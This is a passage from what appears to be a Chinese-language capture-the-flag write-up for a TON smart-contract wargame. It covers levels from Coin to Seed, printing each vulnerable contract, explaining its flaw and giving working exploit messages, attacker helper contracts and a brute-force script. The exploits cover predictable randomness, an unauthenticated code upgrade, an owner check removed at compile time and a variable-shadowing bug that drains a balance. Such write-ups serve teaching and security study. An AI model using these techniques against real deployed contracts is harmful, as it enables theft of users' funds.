\uff0c\u6279\u91cf\u53d1\u9001\u6d88\u606f \u5168\u5c40\u8bbe\u7f6e\u4e2d\u53ef\u4ee5\u4fee\u6539\u6d88\u606f\u9644\u5e26\u7684 TON \u6570\u91cf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import \"@stdlib/deploy\" ; message Swap { cnt : Int as uint32 ; target : Address ; } contract MultiMessageSender with Deployable { // example args: {cnt: 1000, value: 1 TON} receive ( msg : Swap ) { repeat ( msg . cnt ) { send ( SendParameters { to : msg . target , value : ton ( \"0.008\" ), mode : SendDefaultMode + SendPayGasSeparately , body : \"swap ton to tokens\" . asComment () }); } } } \u68c0\u67e5\u7ed3\u675f\u540e\u53d6\u56de\u5408\u7ea6\u4e2d\u7684 TON 1 2 > await contract . send ( player , { value : toNano ( \"0.008\" )}, \"swap tokens to ton\" ); > await contract . send ( player , { value : toNano ( \"0.005\" )}, \"withdraw\" ); 8. COIN \u00b6 To complete the level, guess 10 times in a row which side the coin will land on. CoinLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 import \"@stdlib/deploy\" ; import \"../messages\" ; message Flip { side : Bool ; } contract Contract { nonce : Int ; init ( nonce : Int ){ self . nonce = nonce ; } } contract CoinLevel with Deployable { player : Address ; nonce : Int ; consecutiveWins : Int = 0 ; flipsCount : Int = 0 ; init ( player : Address , nonce : Int ){ self . player = player ; self . nonce = nonce ; } receive ( msg : Flip ){ let init : StateInit = initOf Contract ( self . flipsCount ); let contractAddress : Address = contractAddress ( init ); let side = contractAddress . asSlice (). asCell (). hash () % 2 == 0 ; self . consecutiveWins = msg . side == side ? self . consecutiveWins + 1 : 0 ; self . flipsCount += 1 ; } receive ( \"check\" ){ send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"coin\" , completed : self . consecutiveWins >= 10 }. toCell () } ); } get fun consecutiveWins () : Int { return self . consecutiveWins ; } get fun flipsCount () : Int { return self . flipsCount ; } } \u9700\u8981\u8fde\u7eed\u731c\u5bf9 10 \u6b21\uff0c\u501f\u52a9\u8f85\u52a9\u5408\u7ea6\u9884\u6d4b\u7ed3\u679c\u5e76\u53d1\u9001\u6d88\u606f \u9898\u76ee\u5408\u7ea6\u4f7f\u7528\u7684 Tact \u7f16\u8bd1\u5668\u7248\u672c\u4e3a 1.4.4\u3002\u4e0d\u540c\u7f16\u8bd1\u5668\u7248\u672c\u53ef\u80fd\u4ea7\u751f\u4e0d\u540c\u7684\u7f16\u8bd1\u7ed3\u679c\uff0c\u6700\u597d \u4f7f\u7528\u76f8\u540c\u7248\u672c\u7684\u7f16\u8bd1\u5668 \uff0c\u4fdd\u8bc1 initOf \u5728\u8f85\u52a9\u5408\u7ea6\u4e2d\u7684\u8ba1\u7b97\u7ed3\u679c\u4e0e\u5b9e\u4f8b\u5408\u7ea6\u76f8\u540c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 import \"@stdlib/deploy\" ; message Flip { side : Bool ; } message Guess { cnt : Int as uint32 ; start : Int as uint32 ; target : Address ; } contract Contract { nonce : Int ; init ( nonce : Int ){ self . nonce = nonce ; } } contract Guesser with Deployable { receive ( msg : Guess ) { let p : Int = msg . start ; while ( p < msg . start + msg . cnt ) { let init : StateInit = initOf Contract ( p ); let contractAddress : Address = contractAddress ( init ); let side : Bool = contractAddress . asSlice (). asCell (). hash () % 2 == 0 ; send ( SendParameters { to : msg . target , value : ton ( \"0.01\" ), mode : SendDefaultMode + SendPayGasSeparately , body : Flip { side : side }. toCell () }); p += 1 ; } } } 9. GATEKEEPER \u00b6 Unlock the contract below to complete this level. GatekeeperLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import \"@stdlib/deploy\" ; import \"../messages\" ; message Unlock { a : Int ; b : Int ; } contract GatekeeperLevel with Deployable { player : Address ; nonce : Int ; locked : Bool = true ; init ( player : Address , nonce : Int ){ self . player = player ; self . nonce = nonce ; } receive ( msg : Unlock ){ require (( sender (). asSlice (). asCell (). hash () ^ (( msg . a << 2 ) + msg . b )) == myAddress (). asSlice (). asCell (). hash (), \"Check failed.\" ); self . locked = false ; } receive ( \"check\" ){ send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"gatekeeper\" , completed : ! self . locked }. toCell () } ); } get fun locked () : Bool { return self . locked ; } } \u89e3\u9501\u9700\u8981 sender().asSlice().asCell().hash() ^ ((msg.a << 2) + msg.b) \u7684\u503c\u4e0e myAddress().asSlice().asCell().hash() \u76f8\u7b49 \u83b7\u53d6\u5b9e\u4f8b\u5730\u5740\u7684\u54c8\u5e0c\u503c 1 2 > beginCell (). storeAddress ( contract . address ). endCell (). hash (). toHex () 3036979211 fd86c13a1113af157f701ea19eafb8e1d1c36d761c5ff41c99bc80 \u7531\u4e8e a \u548c b \u6ca1\u6709\u9650\u5236\u8303\u56f4\uff0c\u53ef\u4ee5\u76f4\u63a5\u5c06 a \u8bbe\u7f6e\u4e3a 0\uff0c b \u4e3a\u53d1\u9001\u8005\u5730\u5740\u54c8\u5e0c\u503c\u4e0e\u5b9e\u4f8b\u5730\u5740\u54c8\u5e0c\u503c\u5f02\u6216\u7684\u7ed3\u679c 1 > await contract . send ( player , { value : toNano ( '0.01' )}, { $$type : 'Unlock' , a : 0n , b : 86130810477776835231294161513457632144148633294017539526014373747458502429745n }); 10. BRUTE-FORCE \u00b6 Unlock the contract below to complete this level. BruteforceLevel 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 import \"@stdlib/deploy\" ; import \"../messages\" ; message Unlock { a : Int ; b : Int ; c : Int ; d : Int ; } contract BruteforceLevel with Deployable { player : Address ; nonce : Int ; locked : Bool = true ; x : Int as uint8 = 0 ; y : Int as uint8 = 0 ; init ( player : Address , nonce : Int ){ self . player = player ; self . nonce = nonce ; } receive ( msg : Unlock ){ self . x = msg . a + msg . c ; self . y = msg . b + msg . d ; require (( self . x + self . y ) == 2 , \"First check failed.\" ); require (((( pow ( msg . a , 25 ) + pow ( msg . b , 25 )) + pow ( msg . c , 25 )) + pow ( msg . d , 25 )) == 1968172103452999492963878188028555943794336458502883276710491621054698698752 , \"Second check failed.\" ); self . locked = false ; } receive ( \"check\" ){ send ( SendParameters { to : sender (), value : 0 , mode : SendRemainingValue , bounce : false , body : CheckLevelResult { name : \"bruteforce\" , completed : ! self . locked }. toCell () } ); } get fun locked () : Bool { return self . locked ; } } \u89e3\u9501\u9700\u8981\u63d0\u4f9b\u6ee1\u8db3\u7279\u5b9a\u6761\u4ef6\u7684\u56db\u4e2a\u6574\u6570 (self.x + self.y) == 2 \u5373 msg.a + msg.b + msg.c + msg.d == 2 \uff0c\u8bf4\u660e\u6b63\u8d1f\u6574\u6570\u7684\u7edd\u5bf9\u503c\u4e4b\u5dee\u4e3a 2\uff0c\u4e14 msg.a + msg.c \u548c msg.b + msg.d \u7684\u7ed3\u679c\u5728 8 \u4f4d\u65e0\u7b26\u53f7\u6574\u578b\u7684\u8303\u56f4\u5185 (((pow(msg.a, 25) + pow(msg.b, 25)) + pow(msg.c, 25)) + pow(msg.d, 25)) \u7684\u7ed3\u679c\u662f\u4e00\u4e2a\u6b63\u6574\u6570 1968172103452999492963878188028555943794336458502883276710491621054698698752 \u7531\u6b64\u63a8\u6d4b\u51fa\u4e24\u79cd\u53ef\u80fd\u7684\u60c5\u51b5 self.x \u4e3a 2\uff0c self.y \u4e3a 0\uff08\u53cd\u4e4b\u4ea6\u540c\uff09 self.x \u548c self.y \u540c\u4e3a 1 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 t = 1968172103452999492963878188028555943794336458502883276710491621054698698752 for a in range ( 2 , 3000 ): c = - ( a - 2 ) r = pow ( a , 25 ) + pow ( c , 25 ) if r == t : print ( a , c ) break if r > t : break for a in range ( 1 , 3000 ): for b in range ( 1 , 3000 ): c , d = - ( a - 1 ), - ( b - 1 ) r = pow ( a , 25 ) + pow ( b , 25 ) + pow ( c , 25 ) + pow ( d , 25 ) if r == t : print ( a , b , c , d ) break else : continue break \u53d1\u9001\u7ed3\u679c\u5230\u5b9e\u4f8b\u5408\u7ea6 1 > await contract . send ( player , { value : toNano ( '0.01' )}, { $$type : 'Unlock' , a : 850 , b : 1200 , c : - 849 , d : - 1199 }); 11. TOLK \u00b6 Unlock the contract below to complete this level. Tolk 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 const OP_UNLOCK = \"op::unlock\"c; // create an opcode from string using the \"c\" prefix, this results in 0xf0fd50bb opcode in this case // storage variables global ctxPlayer: slice; global ctxNonce: int; global ctxLocked: bool; // loadData populates storage variables using stored data fun loadData() { var ds = getContractData().beginParse(); ctxPlayer = ds.loadAddress(); ctxNonce = ds.loadUint(32); ctxLocked = ds.loadBool(); ds.assertEndOfSlice(); } // saveData stores storage variables as a cell into persistent storage fun saveData() { setContractData( beginCell() .storeSlice(ctxPlayer) .storeUint(ctxNonce, 32) .storeBool(ctxLocked) .endCell() ); } // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) { if (inMsgBody.isEndOfSlice()) { // ignore all empty messages return; } var cs: slice = inMsgFull.beginParse(); val flags: int = cs.loadUint(4); if (flags & 1) { // ignore all bounced messages return; } val senderAddress: slice = cs.loadAddress(); loadData(); // here we populate the storage variables val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op // receive \"check\" message if (isSliceBitsEqual(inMsgBody, \"check\")) { // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"tolk\").endCell()) .storeBool(!ctxLocked) .endCell(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); return; } if (op == OP_UNLOCK) { ctxLocked = false; saveData(); return; } throw 0xffff; // if the message contains an op that is not known to this contract, we throw } // get methods are a means to conveniently read contract data using, for example, HTTP APIs // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts get locked(): bool { loadData(); return ctxLocked; } \u53d1\u9001 OP_UNLOCK \u5bf9\u5e94\u7684\u64cd\u4f5c\u7801\u5373\u53ef\u89e3\u9501\u3002 1 > await contract . send ( player , beginCell (). storeUint ( 0xf0fd50bb , 32 ). endCell (), toNano ( '0.005' )); 12. UPGRADE \u00b6 Unlock the contract below to complete this level. Upgrade 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 const OP_UPGRADE = \"op::upgrade\"c; // create an opcode from string using the \"c\" prefix, this results in 0xdbfaf817 opcode in this case // storage variables global ctxPlayer: slice; global ctxNonce: int; global ctxLocked: bool; // loadData populates storage variables using stored data fun loadData() { var ds = getContractData().beginParse(); ctxPlayer = ds.loadAddress(); ctxNonce = ds.loadUint(32); ctxLocked = ds.loadBool(); ds.assertEndOfSlice(); } // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) { if (inMsgBody.isEndOfSlice()) { // ignore all empty messages return; } var cs: slice = inMsgFull.beginParse(); val flags: int = cs.loadUint(4); if (flags & 1) { // ignore all bounced messages return; } val senderAddress: slice = cs.loadAddress(); loadData(); // here we populate the storage variables val op: int = inMsgBody.loadUint(32); // by convention, the first 32 bits of incoming message is the op // receive \"check\" message if (isSliceBitsEqual(inMsgBody, \"check\")) { // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"upgrade\").endCell()) .storeBool(!ctxLocked) .endCell(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); return; } if (op == OP_UPGRADE) { val code: cell = inMsgBody.loadRef(); setContractCodePostponed(code); return; } throw 0xffff; // if the message contains an op that is not known to this contract, we throw } // get methods are a means to conveniently read contract data using, for example, HTTP APIs // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts get locked(): bool { loadData(); return ctxLocked; } \u5411\u5408\u7ea6\u53d1\u9001 OP_UPGRADE \u6d88\u606f\u53ef\u4ee5\u66f4\u65b0\u5408\u7ea6\u7684\u4ee3\u7801 1 2 3 4 5 if (op == OP_UPGRADE) { val code: cell = inMsgBody.loadRef(); setContractCodePostponed(code); return; } \u53ef\u4ee5\u5728\u65b0\u4ee3\u7801\u4e2d\u589e\u52a0\u66f4\u65b0\u5b58\u50a8\u7684\u903b\u8f91 1 2 3 4 5 6 if (op == 0x12345678) { setContractData( beginCell().storeSlice(ctxPlayer).storeUint(ctxNonce, 32).storeBool(false).endCell() ); return; } \u66f4\u65b0\u4ee3\u7801\u5e76\u89e3\u9501 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 export async function run ( provider : NetworkProvider , args : string []) { const ui = provider . ui (); const address = Address . parse ( args . length > 0 ? args [ 0 ] : await ui . input ( 'old address' )); const oldContract = provider . open ( Upgrade . createFromAddress ( address )); await oldContract . send ( provider . sender (), beginCell (). storeUint ( 0xdbfaf817 , 32 ). storeRef ( await compile ( \"Upgrade\" )). endCell (), toNano ( '0.05' ) ); sleep ( 10000 ); await oldContract . send ( provider . sender (), beginCell (). storeUint ( 0x12345678 , 32 ). endCell (), toNano ( '0.01' ) ); } 13. ACCESS \u00b6 Unlock the contract below to complete this level. Access 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 #include \"../imports/stdlib.fc\" ; const op :: unlock = \"op::unlock\" c ; ;; create an opcode from string using the \"c\" prefix , this results in 0xf0fd50bb opcode in this case const op :: change_owner = \"op::change_owner\" c ; ;; create an opcode from string using the \"c\" prefix , this results in 0xf1eef33c opcode in this case const op :: change_nonce = \"op::change_nonce\" c ; ;; create an opcode from string using the \"c\" prefix , this results in 0x8caa87bd opcode in this case ;; storage variables global slice ctx_player ; global int ctx_nonce ; global slice ctx_owner ; global int ctx_locked ; ;; load_data populates storage variables using stored data () load_data () impure { var ds = get_data (). begin_parse () ; ctx_player = ds ~ load_msg_addr () ; ctx_nonce = ds ~ load_uint ( 32 ) ; ctx_owner = ds ~ load_msg_addr () ; ctx_locked = ds ~ load_int ( 1 ) ; ds . end_parse () ; } ;; save_data stores storage variables as a cell into persistent storage () save_data () impure { set_data ( begin_cell () . store_slice ( ctx_player ) . store_uint ( ctx_nonce , 32 ) . store_slice ( ctx_owner ) . store_int ( ctx_locked , 1 ) . end_cell () ) ; } () check_owner ( slice sender ) { throw_unless ( 501 , equal_slice_bits ( sender , ctx_owner )) ; } ;; recv_internal is the main function of the contract and is called when it receives a message from other contracts () recv_internal ( int my_balance , int msg_value , cell in_msg_full , slice in_msg_body ) impure { if ( in_msg_body . slice_empty ? ()) { ;; ignore all empty messages return () ; } slice cs = in_msg_full . begin_parse () ; int flags = cs ~ load_uint ( 4 ) ; if ( flags & 1 ) { ;; ignore all bounced messages return () ; } slice sender_address = cs ~ load_msg_addr () ; load_data () ; ;; here we populate the storage variables int op = in_msg_body ~ load_uint ( 32 ) ; ;; by convention , the first 32 bits of incoming message is the op ;; receive \"check\" message if ( equal_slice_bits ( in_msg_body , \"check\" )) { ;; send CheckLevelResult msg cell msg_body = begin_cell () . store_uint ( 0x6df37b4d , 32 ) . store_ref ( begin_cell (). store_slice ( \"access\" ). end_cell ()) . store_int ( ~ ctx_locked , 1 ) . end_cell () ; builder msg = begin_cell () . store_uint ( 0x18 , 6 ) . store_slice ( sender_address ) . store_coins ( 0 ) . store_uint ( 1 , 1 + 4 + 4 + 64 + 32 + 1 + 1 ) . store_ref ( msg_body ) ; ;; send all the remaining value send_raw_message ( msg . end_cell (), 64 ) ; return () ; } if ( op == op :: unlock ) { ctx_locked = ~ equal_slice_bits ( ctx_player , ctx_owner ) ; save_data () ; return () ; } if ( op == op :: change_owner ) { check_owner ( sender_address ) ; throw_unless ( 502 , ctx_nonce == 9999 ) ; ctx_owner = in_msg_body ~ load_msg_addr () ; save_data () ; return () ; } if ( op == op :: change_nonce ) { ctx_nonce = in_msg_body ~ load_uint ( 32 ) ; save_data () ; return () ; } throw ( 0xffff ) ; ;; if the message contains an op that is not known to this contract , we throw } ;; get methods are a means to conveniently read contract data using , for example , HTTP APIs ;; they are marked with method_id ;; note that unlike in many other smart contract VMs , get methods cannot be called by other contracts int nonce () method_id { load_data () ; return ctx_nonce ; } slice owner () method_id { load_data () ; return ctx_owner ; } int locked () method_id { load_data () ; return ctx_locked ; } \u89e3\u9501\u9700\u8981 ctx_owner \u662f ctx_player 1 2 3 4 5 if ( op == op :: unlock ) { ctx_locked = ~ equal_slice_bits ( ctx_player , ctx_owner ); save_data (); return (); } \u64cd\u4f5c op::change_owner \u8c03\u7528\u51fd\u6570 check_owner() \u68c0\u67e5\u8c03\u7528\u8005\u662f\u5426\u4e3a ctx_owner \uff0c\u4f46\u7531\u4e8e\u672a\u4f7f\u7528 impure \u6807\u8bc6\u7b26\u4e14\u6ca1\u6709\u68c0\u67e5\u51fd\u6570\u8c03\u7528\u7684\u7ed3\u679c\uff0c\u8be5\u51fd\u6570\u8c03\u7528\u4f1a\u5728\u7f16\u8bd1\u65f6\u88ab\u79fb\u9664 1 2 3 () check_owner ( slice sender ) { throw_unless ( 501 , equal_slice_bits ( sender , ctx_owner )); } \u56e0\u6b64\uff0c\u5148\u4fee\u6539 ctx_nonce \u518d\u66f4\u65b0 ctx_owner \uff0c\u5373\u53ef\u89e3\u9501 1 2 3 > await contract . send ( player , beginCell (). storeUint ( 0x8caa87bd , 32 ). storeUint ( 9999 , 32 ). endCell (), toNano ( \"0.01\" )); > await contract . send ( player , beginCell (). storeUint ( 0xf1eef33c , 32 ). storeAddress ( player . address ). endCell (), toNano ( \"0.01\" )); > await contract . send ( player , beginCell (). storeUint ( 0xf0fd50bb , 32 ). endCell (), toNano ( \"0.01\" )); 14. DONATE \u00b6 You will beat this level if you manage to reduce its balance to 0. Donate 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 #include \"../imports/stdlib.fc\" ; const donation_goal = 1000000000 ; const gas_consumption = 5000000 ; const op :: change_destination = \"op::change_destination\" c ; ;; create an opcode from string using the \"c\" prefix , this results in 0xbaed25a6 opcode in this case const op :: withdraw = \"op::withdraw\" c ; ;; create an opcode from string using the \"c\" prefix , this results in 0xcb03bfaf opcode in this case const op :: donate = \"op::donate\" c ; ;; create an opcode from string using the \"c\" prefix , this results in 0x47bbe425 opcode in this case ;; storage variables global slice player ; global int nonce ; global slice owner ; global slice destination ; global int donations_count ; ;; load_data populates storage variables using stored data () load_data () impure { var ds = get_data (). begin_parse () ; player = ds ~ load_msg_addr () ; nonce = ds ~ load_uint ( 32 ) ; owner = ds ~ load_msg_addr () ; destination = ds ~ load_msg_addr () ; donations_count = ds ~ load_uint ( 32 ) ; ds . end_parse () ; } ;; save_data stores storage variables as a cell into persistent storage () save_data () impure { set_data ( begin_cell () . store_slice ( player ) . store_uint ( nonce , 32 ) . store_slice ( owner ) . store_slice ( destination ) . store_uint ( donations_count , 32 ) . end_cell () ) ; } ;; recv_internal is the main function of the contract and is called when it receives a message from other contracts () recv_internal ( int my_balance , int msg_value , cell in_msg_full , slice in_msg_body ) impure { if ( in_msg_body . slice_empty ? ()) { ;; ignore all empty messages return () ; } slice cs = in_msg_full . begin_parse () ; int flags = cs ~ load_uint ( 4 ) ; if ( flags & 1 ) { ;; ignore all bounced messages return () ; } slice sender_address = cs ~ load_msg_addr () ; load_data () ; ;; here we populate the storage variables int op = in_msg_body ~ load_uint ( 32 ) ; ;; by convention , the first 32 bits of incoming message is the op ;; receive \"check\" message if ( equal_slice_bits ( in_msg_body , \"check\" )) { ;; send CheckLevelResult msg cell msg_body = begin_cell () . store_uint ( 0x6df37b4d , 32 ) . store_ref ( begin_cell (). store_slice ( \"donate\" ). end_cell ()) . store_int ( my_balance - msg_value == 0 , 1 ) . end_cell () ; builder msg = begin_cell () . store_uint ( 0x18 , 6 ) . store_slice ( sender_address ) . store_coins ( 0 ) . store_uint ( 1 , 1 + 4 + 4 + 64 + 32 + 1 + 1 ) . store_ref ( msg_body ) ; ;; send all the remaining value send_raw_message ( msg . end_cell (), 64 ) ; return () ; } if ( op == op :: change_destination ) { throw_unless ( 501 , equal_slice_bits ( sender_address , owner )) ; var new_destination = in_msg_body ~ load_msg_addr () ; destination = new_destination ; save_data () ; return () ; } if ( op == op :: withdraw ) { throw_unless ( 502 , equal_slice_bits ( sender_address , destination )) ; builder msg = begin_cell () . store_uint ( 0x18 , 6 ) . store_slice ( destination ) . store_coins ( 0 ) . store_uint ( 0 , 1 + 4 + 4 + 64 + 32 + 1 + 1 ) ; ;; send all the contract balance send_raw_message ( msg . end_cell (), 128 ) ; return () ; } if ( op == op :: donate ) { throw_unless ( 503 , my_balance - msg_value < donation_goal ) ; if ( my_balance > donation_goal ) { var destination = in_msg_body ~ load_msg_addr () ; builder msg = begin_cell () . store_uint ( 0x18 , 6 ) . store_slice ( destination ) . store_coins ( my_balance - donation_goal - gas_consumption ) . store_uint ( 0 , 1 + 4 + 4 + 64 + 32 + 1 + 1 ) ; send_raw_message ( msg . end_cell (), 0 ) ; } donations_count += 1 ; save_data () ; return () ; } throw ( 0xffff ) ; ;; if the message contains an op that is not known to this contract , we throw } ;; get methods are a means to conveniently read contract data using , for example , HTTP APIs ;; they are marked with method_id ;; note that unlike in many other smart contract VMs , get methods cannot be called by other contracts slice _owner () method_id { load_data () ; return owner ; } slice _destination () method_id { load_data () ; return destination ; } int _donations_count () method_id { load_data () ; return donations_count ; } int balance () method_id { [ int value , _ ] = get_balance () ; return value ; } \u64cd\u4f5c op::withdraw \u53ef\u4ee5\u5c06\u5408\u7ea6\u6240\u6301\u6709\u7684\u6240\u6709 TON \u90fd\u53d1\u9001\u7ed9\u8c03\u7528\u8005 destination \u4fee\u6539 destination \u7684\u64cd\u4f5c op::change_destination \u53ea\u6709 owner \u53ef\u4ee5\u8c03\u7528 \u7531\u4e8e\u5168\u5c40\u53d8\u91cf\u4e0d\u80fd\u88ab\u91cd\u5b9a\u4e49\uff0c\u5f53\u5408\u7ea6\u4f59\u989d\u5927\u4e8e donation_goal \u65f6\uff0c\u64cd\u4f5c op::donate \u5b9e\u9645\u4e0a\u66f4\u65b0\u7684\u662f\u5168\u5c40\u53d8\u91cf destination \uff0c\u800c\u4e0d\u662f\u5176\u5b9a\u4e49\u7684\u672c\u5730\u53d8\u91cf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 if ( op == op :: donate ) { throw_unless ( 503 , my_balance - msg_value < donation_goal ); if ( my_balance > donation_goal ) { var destination = in_msg_body ~ load_msg_addr (); builder msg = begin_cell () . store_uint ( 0x18 , 6 ) . store_slice ( destination ) . store_coins ( my_balance - donation_goal - gas_consumption ) . store_uint ( 0 , 1 + 4 + 4 + 64 + 32 + 1 + 1 ); send_raw_message ( msg . end_cell (), 0 ); } donations_count += 1 ; save_data (); return (); } \u6350\u6b3e\u5e76\u8bbe\u7f6e destination \uff0c\u968f\u540e\u53d1\u9001 op::withdraw \u6d88\u606f 1 2 > await contract . send ( player , beginCell (). storeUint ( 0x47bbe425 , 32 ). storeAddress ( player . address ). endCell (), toNano ( 1 )); > await contract . send ( player , beginCell (). storeUint ( 0xcb03bfaf , 32 ). endCell (), toNano ( \"0.01\" )); References \u00b6 Variable declaration 15. LOGICAL \u00b6 Unlock the contract below to complete this level. Logical 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 // storage variables global ctxPlayer: slice; global ctxNonce: int; global ctxLocked: bool; global ctxPrevLogicalTime: int; global ctxLogicalTimeDiff: int; // loadData populates storage variables using stored data fun loadData() { var ds = getContractData().beginParse(); ctxPlayer = ds.loadAddress(); ctxNonce = ds.loadUint(32); ctxLocked = ds.loadBool(); ctxPrevLogicalTime = ds.loadUint(64); ctxLogicalTimeDiff = ds.loadUint(32); ds.assertEndOfSlice(); } // saveData stores storage variables as a cell into persistent storage fun saveData() { setContractData( beginCell() .storeSlice(ctxPlayer) .storeUint(ctxNonce, 32) .storeBool(ctxLocked) .storeUint(ctxPrevLogicalTime, 64) .storeUint(ctxLogicalTimeDiff, 32) .endCell() ); } // onInternalMessage is the main function of the contract and is called when it receives a message from other contracts fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) { if (inMsgBody.isEndOfSlice()) { // ignore all empty messages return; } var cs: slice = inMsgFull.beginParse(); val flags: int = cs.loadUint(4); if (flags & 1) { // ignore all bounced messages return; } val senderAddress: slice = cs.loadAddress(); loadData(); // here we populate the storage variables inMsgBody.skipBits(32); // by convention, the first 32 bits of incoming message is the op // receive \"check\" message if (isSliceBitsEqual(inMsgBody, \"check\")) { // send CheckLevelResult msg val msgBody: cell = beginCell() .storeUint(0x6df37b4d, 32) .storeRef(beginCell().storeSlice(\"logical\").endCell()) .storeBool(!ctxLocked) .endCell(); val msg: builder = beginCell() .storeUint(0x18, 6) .storeSlice(senderAddress) .storeCoins(0) .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1) .storeRef(msgBody); // send all the remaining value sendRawMessage(msg.endCell(), 64); return; } if (getLogicalTime() - ctxPrevLogicalTime == ctxLogicalTimeDiff) { ctxLocked = false; } ctxPrevLogicalTime = getLogicalTime(); saveData(); } // get methods are a means to conveniently read contract data using, for example, HTTP APIs // note that unlike in many other smart contract VMs, get methods cannot be called by other contracts get locked(): bool { loadData(); return ctxLocked; } get prevLogicalTime(): int { loadData(); return ctxPrevLogicalTime; } get logicalTimeDiff(): int { loadData(); return ctxLogicalTimeDiff; } \u5f53\u5f53\u524d\u4ea4\u6613\u7684\u903b\u8f91\u65f6\u95f4\u548c\u4e0a\u4e00\u4ea4\u6613\u7684\u903b\u8f91\u65f6\u95f4\u4e4b\u5dee\u4e3a ctxLogicalTimeDiff \u65f6\uff0c\u53ef\u4ee5\u89e3\u9501 1 2 3 4 if (getLogicalTime() - ctxPrevLogicalTime == ctxLogicalTimeDiff) { ctxLocked = false; } ctxPrevLogicalTime = getLogicalTime(); \u83b7\u53d6 ctxLogicalTimeDiff \u7684\u503c 1 2 > await contract . getLogicalTimeDiff (); 1n \u7531\u4e8e\u8981\u6c42\u903b\u8f91\u65f6\u95f4\u5dee\u4ec5\u4e3a 1\uff0c\u53ef\u4ee5\u4ece\u540c\u4e00\u4e2a\u5408\u7ea6\u4e2d\u53d1\u51fa\u4e24\u6761\u6d88\u606f 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import \"@stdlib/deploy\" ; message Send { target : Address ; } contract MultiMessageSender with Deployable { receive ( msg : Send ) { repeat ( 2 ) { send ( SendParameters { to : msg . target , value : ton ( \"0.008\" ), mode : SendDefaultMode + SendPayGasSeparately , body : beginCell (). storeUint ( 0 , 32 ). endCell () }); } } } 16. SEED \u00b6 Unlock the contract below to complete this level. Seed 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 